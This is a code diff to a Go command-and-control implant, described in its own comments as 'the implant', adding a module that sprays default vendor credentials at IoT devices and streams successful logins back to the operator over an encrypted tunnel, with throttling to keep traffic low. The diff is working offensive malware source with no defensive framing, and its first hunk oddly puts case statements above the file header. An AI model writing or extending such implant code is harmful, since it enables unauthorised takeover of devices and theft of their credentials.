@@ -1,3 +1,10 @@
+		case proto.TypeIoTCredsStart:
+			var ic proto.IoTCredsStart
+			if err := json.Unmarshal(env.Payload, &ic); err != nil {
+				log.Printf("[iotcreds] unmarshal: %v", err)
+				continue
+			}
+			go runIoTCreds(conn, sess, ic)
 // redsky-agent — the implant.
 // Phase 5: persistent connection. One TLS + ECDH handshake, then a loop that
 // reads tasks, executes them, and sends results until the core closes the
@@ -34,7 +41,9 @@ import (
 	"github.com/sk666G/red-sky---arsenal/internal/wire"
 	"path/filepath"
 	"github.com/sk666G/red-sky---arsenal/internal/cryptor"
+	"github.com/sk666G/red-sky---arsenal/internal/iotcreds"
 )
+
 
 
 func main() {
@@ -722,3 +731,61 @@ var (
 	activeCryptoMu sync.Mutex
 	activeCrypto   = map[string]context.CancelFunc{}
 )
+
+// runIoTCreds drives a default-credential spray on the agent. Streams
+// every attempt back over the tunnel — hits flagged OK, misses flagged !OK.
+// Called via proto.TypeIoTCredsStart.
+func runIoTCreds(conn net.Conn, sess *crypto.Session, ic proto.IoTCredsStart) {
+	send := func(hit iotcreds.Hit, idx, total int, ok, done bool, errStr string) {
+		sendTunnelAck(conn, sess, proto.TypeIoTCredsData, proto.IoTCredsData{
+			SessionID: ic.SessionID,
+			Index:     idx,
+			Total:     total,
+			Vendor:    hit.Vendor,
+			User:      hit.User,
+			Pass:      hit.Pass,
+			OK:        ok,
+			Done:      done,
+			Error:     errStr,
+		})
+	}
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	activeCryptoMu.Lock()
+	activeCrypto[ic.SessionID] = cancel
+	activeCryptoMu.Unlock()
+	defer func() {
+		activeCryptoMu.Lock()
+		delete(activeCrypto, ic.SessionID)
+		activeCryptoMu.Unlock()
+	}()
+
+	total := iotcreds.Count()
+	var hitCount int
+	onAttempt := func(i int, c iotcreds.Cred, ok bool) {
+		if ok {
+			hitCount++
+			send(iotcreds.Hit{Vendor: c.Vendor, User: c.User, Pass: c.Pass}, i, total, true, false, "")
+		} else if i%8 == 0 {
+			// throttle misses — every 8th attempt to keep tunnel chatter down
+			send(iotcreds.Hit{Vendor: c.Vendor, User: c.User, Pass: c.Pass}, i, total, false, false, "")
+		}
+	}
+
+	hits, err := iotcreds.Spray(ctx, iotcreds.SprayOptions{
+		Host:      ic.Host,
+		Port:      ic.Port,
+		Protocol:  ic.Protocol,
+		Path:      ic.Path,
+		Timeout:   ic.Timeout,
+		StopFirst: ic.StopFirst,
+	}, onAttempt)
+
+	errStr := ""
+	if err != nil {
+		errStr = err.Error()
+	}
+	send(iotcreds.Hit{}, total, total, len(hits) > 0, true, errStr)
+}
+
